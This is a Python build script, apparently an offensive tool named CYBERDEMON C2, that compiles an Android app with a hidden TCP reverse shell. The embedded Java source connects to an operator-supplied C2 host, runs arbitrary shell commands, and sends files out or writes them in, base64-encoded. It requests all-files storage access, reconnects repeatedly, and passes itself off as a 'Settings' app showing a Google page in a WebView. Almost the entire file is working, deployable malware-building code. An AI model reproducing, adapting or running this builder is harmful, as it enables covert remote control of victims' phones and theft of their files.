#!/usr/bin/env python3
"""
CYBERDEMON C2 — Android APK Builder (Reverse Shell Only)
Builds a minimal APK with a raw TCP reverse shell.
"""

import os
import subprocess
import sys
import shutil
import zipfile
import struct
import zlib
import glob
import argparse

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
BUILD_DIR = os.path.join(SCRIPT_DIR, "build")
OUTPUT_APK = os.path.join(SCRIPT_DIR, "cyberdemon_c2.apk")

def _detect_java_home():
    """Locate a real JDK.

    The previous hardcoded default (/usr/lib/jvm/jdk-17.0.11+9) does not exist
    on current Kali, and the fallback Android install has only a JRE, so
    `javac` was missing and the failure surfaced as a generic
    "Tools not found" with no hint about which tool was absent.
    """
    env = os.environ.get("JAVA_HOME")
    if env and os.path.isfile(os.path.join(env, "bin", "javac")):
        return env
    # /usr/lib/jvm/*/bin/javac -- newest real JDK wins, JREs have no javac.
    for root in ("/usr/lib/jvm", "/opt", os.path.expanduser("~/android-sdk")):
        if not os.path.isdir(root):
            continue
        cands = []
        for dirpath, dirnames, _ in os.walk(root):
            depth = dirpath[len(root):].count(os.sep)
            if depth > 2:
                dirnames[:] = []
                continue
            if os.path.isfile(os.path.join(dirpath, "bin", "javac")):
                cands.append(dirpath)
        if cands:
            return sorted(cands)[-1]
    return env or "/usr/lib/jvm/default-java"


def _detect_android_home():
    env = os.environ.get("ANDROID_HOME") or os.environ.get("ANDROID_SDK_ROOT")
    if env and os.path.isdir(os.path.join(env, "build-tools")):
        return env
    for cand in ("/opt/android-sdk", os.path.expanduser("~/android-sdk"),
                 os.path.expanduser("~/Android/Sdk"),
                 "/usr/lib/android-sdk"):
        if os.path.isdir(os.path.join(cand, "build-tools")):
            return cand
    return env or "/opt/android-sdk"


JAVA_HOME = _detect_java_home()
ANDROID_HOME = _detect_android_home()

JAVAC = os.path.join(JAVA_HOME, "bin", "javac")
JAVA = os.path.join(JAVA_HOME, "bin", "java")
KEYTOOL = os.path.join(JAVA_HOME, "bin", "keytool")

ANDROID_JAR = None
AAPT2 = None
D8_JAR = None
ZIPALIGN = None
APKSIGNER_JAR = None


def find_tools():
    global ANDROID_JAR, AAPT2, D8_JAR, ZIPALIGN, APKSIGNER_JAR
    platforms = os.path.join(ANDROID_HOME, "platforms")
    if os.path.isdir(platforms):
        plats = sorted([p for p in os.listdir(platforms) if p.startswith("android-")], reverse=True)
        if plats:
            ANDROID_JAR = os.path.join(platforms, plats[0], "android.jar")
    bt = os.path.join(ANDROID_HOME, "build-tools", "34.0.0")
    for name in ["aapt2_arm64", "aapt2"]:
        p = os.path.join(bt, name)
        if os.path.isfile(p) and os.access(p, os.X_OK):
            AAPT2 = p
            break
    for name in ["zipalign_arm64", "zipalign"]:
        p = os.path.join(bt, name)
        if os.path.isfile(p) and os.access(p, os.X_OK):
            ZIPALIGN = p
            break
    d8jar = os.path.join(bt, "lib", "d8.jar")
    if os.path.isfile(d8jar):
        D8_JAR = d8jar
    apksignerjar = os.path.join(bt, "lib", "apksigner.jar")
    if os.path.isfile(apksignerjar):
        APKSIGNER_JAR = apksignerjar
    return all([ANDROID_JAR, AAPT2, D8_JAR, APKSIGNER_JAR])


def missing_tools():
    """Name exactly what is absent, so the error is actionable.

    find_tools() returns a bare False and the caller printed
    "Tools not found. Check JAVA_HOME / ANDROID_HOME", which never says which
    piece was missing -- aapt2 absent while d8.jar was present looked
    identical to having no SDK at all.
    """
    gaps = []
    for tool, path in (('javac', JAVAC), ('java', JAVA), ('keytool', KEYTOOL)):
        if not os.path.isfile(path):
            gaps.append(f'{tool}  -> {path}')
    bt = os.path.join(ANDROID_HOME, "build-tools", "34.0.0")
    if not ANDROID_JAR:
        gaps.append(f'android.jar -> {ANDROID_HOME}/platforms/android-*/android.jar')
    if not AAPT2:
        gaps.append(f'aapt2 -> {bt}/aapt2')
    if not ZIPALIGN:
        gaps.append(f'zipalign -> {bt}/zipalign')
    if not D8_JAR:
        gaps.append(f'd8.jar -> {bt}/lib/d8.jar')
    if not APKSIGNER_JAR:
        gaps.append(f'apksigner.jar -> {bt}/lib/apksigner.jar')
    return gaps


def run_cmd(cmd, desc=""):
    print(f"  -> {desc}")
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"  [!] FAILED: {result.stderr[:1000]}")
        return False
    return True


def create_icon_png():
    size = 192
    raw = b''
    for y in range(size):
        raw += b'\x00'
        for x in range(size):
            b1, b2 = 8, 24
            if b1 <= x < size - b1 and b1 <= y < size - b1:
                on_b1 = (x == b1 or x == size - b1 - 1 or y == b1 or y == size - b1 - 1)
                in_b2 = (b2 <= x < size - b2 and b2 <= y < size - b2)
                on_b2 = in_b2 and (x == b2 or x == size - b2 - 1 or y == b2 or y == size - b2 - 1)
                raw += bytes([200, 0, 0]) if on_b1 or on_b2 else bytes([15, 15, 15])
            else:
                raw += bytes([10, 10, 10])

    def chunk(ct, data):
        c = ct + data
        return struct.pack('>I', len(data)) + c + struct.pack('>I', zlib.crc32(c) & 0xffffffff)

    ihdr = struct.pack('>IIBBBBB', size, size, 8, 2, 0, 0, 0)
    return (b'\x89PNG\r\n\x1a\n' +
            chunk(b'IHDR', ihdr) +
            chunk(b'IDAT', zlib.compress(raw, 9)) +
            chunk(b'IEND', b''))


def gen_reverse_shell_java(pkg, host, port):
    return f'''package {pkg};

import android.os.Environment;
import android.util.Log;
import java.io.*;
import java.net.Socket;
import java.util.Base64;

public class ReverseShell {{
    private static final String TAG = "CYB3R";
    private String host;
    private int port;
    private volatile boolean running = false;
    private String currentDir = "/storage/emulated/0";

    public ReverseShell(String host, int port) {{
        this.host = host;
        this.port = port;
    }}

    public void start() {{
        running = true;
        new Thread(() -> connect()).start();
    }}

    public void stop() {{ running = false; }}

    private void connect() {{
        while (running) {{
            try {{
                Socket socket = new Socket(host, port);
                socket.setSoTimeout(120000);
                socket.setKeepAlive(true);

                InputStream in = new BufferedInputStream(socket.getInputStream());
                OutputStream out = new BufferedOutputStream(socket.getOutputStream());
                StringBuilder buf = new StringBuilder();

                while (running) {{
                    int ch = in.read();
                    if (ch == -1) break;
                    if (ch == '\\n') {{
                        String cmd = buf.toString().trim();
                        buf.setLength(0);
                        if (!cmd.isEmpty()) execute(cmd, out);
                    }} else {{
                        buf.append((char) ch);
                    }}
                }}
                socket.close();
            }} catch (Exception e) {{
                Log.e(TAG, "err: " + e.getMessage());
            }}
            try {{ Thread.sleep(3000); }} catch (InterruptedException ie) {{ break; }}
        }}
    }}

    private void execute(String cmd, OutputStream out) {{
        try {{
            if (cmd.startsWith("DOWNLOAD:")) {{
                handleDownload(cmd.substring(9), out);
            }} else if (cmd.startsWith("UPLOAD:")) {{
                handleUpload(cmd.substring(7), out);
            }} else {{
                if (cmd.trim().startsWith("cd ")) {{
                    String target = cmd.trim().substring(3).trim();
                    Process tp = new ProcessBuilder("/system/bin/sh", "-c", "cd " + target + " && pwd")
                        .directory(new File(currentDir))
                        .redirectErrorStream(true).start();
                    DataInputStream tdis = new DataInputStream(tp.getInputStream());
                    ByteArrayOutputStream tbaos = new ByteArrayOutputStream();
                    byte[] tmp2 = new byte[4096];
                    int len2;
                    while ((len2 = tdis.read(tmp2)) != -1) tbaos.write(tmp2, 0, len2);
                    tp.waitFor();
                    String newPath = tbaos.toString("UTF-8").trim();
                    if (!newPath.isEmpty() && !newPath.contains("No such file")) {{
                        currentDir = newPath;
                        out.write(("RESULT:" + currentDir + "\\n").getBytes("UTF-8"));
                    }} else {{
                        out.write(("ERR:cd: " + target + ": No such directory\\n").getBytes("UTF-8"));
                    }}
                    out.flush();
                }} else {{
                    Process p = new ProcessBuilder("/system/bin/sh", "-c", cmd)
                        .directory(new File(currentDir))
                        .redirectErrorStream(true).start();
                    DataInputStream dis = new DataInputStream(p.getInputStream());
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    byte[] tmp = new byte[4096];
                    int len;
                    while ((len = dis.read(tmp)) != -1) baos.write(tmp, 0, len);
                    p.waitFor();
                    String res = baos.toString("UTF-8");
                    if (res.length() > 10000) res = res.substring(0, 10000);
                    out.write(("RESULT:" + res + "\\n").getBytes("UTF-8"));
                    out.flush();
                }}
            }}
        }} catch (Exception e) {{
            try {{
                out.write(("ERR:" + e.getMessage() + "\\n").getBytes("UTF-8"));
                out.flush();
            }} catch (Exception ignored) {{}}
        }}
    }}

    private void handleDownload(String filePath, OutputStream out) throws Exception {{
        File f = new File(filePath);
        if (!f.exists()) {{
            out.write(("ERR:File not found: " + filePath + "\\n").getBytes("UTF-8"));
            out.flush();
            return;
        }}
        if (!f.canRead()) {{
            out.write(("ERR:Permission denied: " + filePath + "\\n").getBytes("UTF-8"));
            out.flush();
            return;
        }}
        if (f.length() > 10 * 1024 * 1024) {{
            out.write(("ERR:File too large (>10MB)\\n").getBytes("UTF-8"));
            out.flush();
            return;
        }}
        FileInputStream fis = new FileInputStream(f);
        byte[] fileBytes = new byte[(int) f.length()];
        fis.read(fileBytes);
        fis.close();
        String b64 = Base64.getEncoder().encodeToString(fileBytes);
        out.write(("FILEDATA:" + f.getName() + ":" + b64 + "\\n").getBytes("UTF-8"));
        out.flush();
    }}

    private void handleUpload(String data, OutputStream out) throws Exception {{
        int colon = data.indexOf(':');
        if (colon == -1) {{
            out.write(("ERR:Invalid UPLOAD format\\n").getBytes("UTF-8"));
            out.flush();
            return;
        }}
        String filePath = data.substring(0, colon);
        String b64 = data.substring(colon + 1);
        byte[] fileBytes = Base64.getDecoder().decode(b64);
        File f = new File(filePath);
        File parent = f.getParentFile();
        if (parent != null && !parent.exists()) parent.mkdirs();
        FileOutputStream fos = new FileOutputStream(f);
        fos.write(fileBytes);
        fos.close();
        out.write(("RESULT:Uploaded " + fileBytes.length + " bytes to " + filePath + "\\n").getBytes("UTF-8"));
        out.flush();
    }}
}}'''


def gen_main_activity_java(pkg, c2_host, c2_port, target_url):
    return f'''package {pkg};

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class MainActivity extends Activity {{
    private static final int PERM_REQUEST = 100;
    private WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        requestPermissions();
        startShell();
        loadWebView();
    }}

    private void requestPermissions() {{
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {{
            if (!android.os.Environment.isExternalStorageManager()) {{
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                intent.setData(Uri.parse("package:" + getPackageName()));
                startActivity(intent);
            }}
        }} else {{
            if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {{
                requestPermissions(new String[]{{
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE
                }}, PERM_REQUEST);
            }}
        }}
    }}

    private void startShell() {{
        new Thread(() -> {{
            try {{ Thread.sleep(2000); }} catch (Exception ignored) {{}}
            new ReverseShell("{c2_host}", {c2_port}).start();
        }}).start();
    }}

    private void loadWebView() {{
        webView = new WebView(this);
        setContentView(webView);
        WebSettings ws = webView.getSettings();
        ws.setJavaScriptEnabled(true);
        ws.setDomStorageEnabled(true);
        ws.setLoadWithOverviewMode(true);
        ws.setUseWideViewPort(true);
        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl("{target_url}");
    }}

    @Override
    public void onBackPressed() {{
        if (webView != null && webView.canGoBack()) webView.goBack();
        else super.onBackPressed();
    }}
}}'''


def main():
    parser = argparse.ArgumentParser(description="CYBERDEMON APK Builder — Reverse Shell Only")
    parser.add_argument("--c2-host", required=True, help="C2 host")
    parser.add_argument("--c2-port", type=int, default=8080, help="C2 port (default: 8080)")
    parser.add_argument("--package", default="org.cyberdemon.c2", help="Package name")
    parser.add_argument("--target-url", default="https://www.google.com", help="URL to load in WebView (default: google.com)")
    parser.add_argument("--app-name", default="Settings", help="App name shown on device (default: Settings)")
    parser.add_argument("--icon", default=None, help="Path to custom PNG icon (optional)")
    parser.add_argument("--output", default=OUTPUT_APK, help="Output APK path")
    args = parser.parse_args()

    print("=" * 50)
    print("  CYBERDEMON APK Builder — Reverse Shell")
    print(f"  C2: {args.c2_host}:{args.c2_port}")
    print(f"  App: {args.app_name}")
    print(f"  URL: {args.target_url}")
    print("=" * 50)

    if not find_tools():
        print("[!] Tools not found. JAVA_HOME=%s ANDROID_HOME=%s" % (JAVA_HOME, ANDROID_HOME))
        for gap in missing_tools():
            print(f"      missing: {gap}")
        print("    Install:  sudo apt install openjdk-21-jdk-headless")
        print("              ANDROID_HOME=<sdk> sdkmanager \"platforms;android-34\" "
              "\"build-tools;34.0.0\" \"platform-tools\"")
        sys.exit(1)

    if os.path.exists(BUILD_DIR):
        shutil.rmtree(BUILD_DIR)

    pkg_path = args.package.replace(".", "/")
    res_dir = os.path.join(BUILD_DIR, "res")
    src_dir = os.path.join(BUILD_DIR, "src")
    compiled_res = os.path.join(BUILD_DIR, "compiled_res")
    classes_dir = os.path.join(BUILD_DIR, "classes")
    dex_dir = os.path.join(BUILD_DIR, "dex")

    for d in ["mipmap-hdpi", "values", "layout"]:
        os.makedirs(os.path.join(res_dir, d), exist_ok=True)
    os.makedirs(os.path.join(src_dir, pkg_path), exist_ok=True)
    os.makedirs(compiled_res, exist_ok=True)
    os.makedirs(classes_dir, exist_ok=True)
    os.makedirs(dex_dir, exist_ok=True)

    # Icon
    if args.icon and os.path.isfile(args.icon):
        shutil.copy2(args.icon, os.path.join(res_dir, "mipmap-hdpi", "icon.png"))
        print(f"  Using custom icon: {args.icon}")
    else:
        icon = create_icon_png()
        with open(os.path.join(res_dir, "mipmap-hdpi", "icon.png"), 'wb') as f:
            f.write(icon)

    # strings.xml
    with open(os.path.join(res_dir, "values", "strings.xml"), 'w') as f:
        f.write('<?xml version="1.0" encoding="utf-8"?>\n<resources>\n    <string name="app_name">' + args.app_name.replace('&', '&amp;').replace('<', '&lt;').replace('"', '&quot;') + '</string>\n</resources>')

    # layout - just a blank screen
    with open(os.path.join(res_dir, "layout", "activity_main.xml"), 'w') as f:
        f.write('<?xml version="1.0" encoding="utf-8"?>\n<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="match_parent" />')

    # AndroidManifest
    manifest_path = os.path.join(BUILD_DIR, "AndroidManifest.xml")
    with open(manifest_path, 'w') as f:
        f.write(f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{args.package}">

    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="34" />

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />

    <application
        android:label="@string/app_name"
        android:icon="@mipmap/icon"
        android:requestLegacyExternalStorage="true"
        android:theme="@android:style/Theme.NoTitleBar.Fullscreen">

        <activity android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTask">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>''')

    # Java sources
    java_main = os.path.join(src_dir, pkg_path, "MainActivity.java")
    java_rshell = os.path.join(src_dir, pkg_path, "ReverseShell.java")

    with open(java_main, 'w') as f:
        f.write(gen_main_activity_java(args.package, args.c2_host, args.c2_port, args.target_url))
    with open(java_rshell, 'w') as f:
        f.write(gen_reverse_shell_java(args.package, args.c2_host, args.c2_port))

    # Compile resources
    print("[*] Compiling resources...")
    for pattern in ["mipmap-hdpi/*.png", "values/*.xml", "layout/*.xml"]:
        for rfile in glob.glob(os.path.join(res_dir, pattern)):
            if not run_cmd([AAPT2, "compile", rfile, "-o", compiled_res], f"  {os.path.basename(rfile)}"):
                sys.exit(1)

    # Link
    print("[*] Linking...")
    base_apk = os.path.join(BUILD_DIR, "base.apk")
    flat_files = glob.glob(os.path.join(compiled_res, "*.flat"))
    if not run_cmd([AAPT2, "link", "-o", base_apk, "--manifest", manifest_path,
                     "-I", ANDROID_JAR, "--java", os.path.join(BUILD_DIR, "gen"),
                     "--auto-add-overlay"] + flat_files, "aapt2 link"):
        sys.exit(1)

    # Compile Java
    print("[*] Compiling Java...")
    r_java = os.path.join(BUILD_DIR, "gen", pkg_path, "R.java")
    for root, dirs, files in os.walk(os.path.join(BUILD_DIR, "gen")):
        for f in files:
            if f == "R.java":
                r_java = os.path.join(root, f)
    if not run_cmd([JAVAC, "-source", "11", "-target", "11",
                     "-classpath", ANDROID_JAR, "-d", classes_dir,
                     r_java, java_main, java_rshell], "javac"):
        sys.exit(1)

    # DEX
    print("[*] Building DEX...")
    class_files = []
    for root, dirs, files in os.walk(classes_dir):
        for f in files:
            if f.endswith('.class'):
                class_files.append(os.path.join(root, f))
    if not run_cmd([JAVA, "-cp", D8_JAR, "com.android.tools.r8.D8",
                     "--output", dex_dir, "--lib", ANDROID_JAR,
                     "--min-api", "21"] + class_files, "d8"):
        sys.exit(1)

    # Pack DEX into APK
    print("[*] Packing APK...")
    final_unsigned = os.path.join(BUILD_DIR, "final_unsigned.apk")
    with zipfile.ZipFile(base_apk, 'r') as zin:
        with zipfile.ZipFile(final_unsigned, 'w', zipfile.ZIP_DEFLATED) as zout:
            for item in zin.infolist():
                zout.writestr(item, zin.read(item))
            zout.write(os.path.join(dex_dir, "classes.dex"), "classes.dex")

    # Align
    aligned = os.path.join(BUILD_DIR, "aligned.apk")
    if ZIPALIGN:
        run_cmd([ZIPALIGN, "-f", "4", final_unsigned, aligned], "zipalign")
    else:
        aligned = final_unsigned

    # Sign
    print("[*] Signing...")
    keystore = os.path.join(BUILD_DIR, "debug.keystore")
    subprocess.run([KEYTOOL, "-genkeypair", "-v",
                    "-keystore", keystore, "-storepass", "android",
                    "-alias", "androiddebugkey", "-keypass", "android",
                    "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000",
                    "-dname", "CN=Debug,OU=Debug,O=Debug,L=Debug,ST=Debug,C=US"],
                   capture_output=True)
    if not run_cmd([JAVA, "-jar", APKSIGNER_JAR, "sign",
                     "--ks", keystore, "--ks-pass", "pass:android",
                     "--key-pass", "pass:android", "--ks-key-alias", "androiddebugkey",
                     "--out", args.output, aligned], "apksigner"):
        sys.exit(1)

    size_kb = os.path.getsize(args.output) / 1024
    print(f"\n[+] Done: {args.output} ({size_kb:.1f} KB)")
    print(f"[+] Install: adb install {args.output}")


if __name__ == "__main__":
    main()
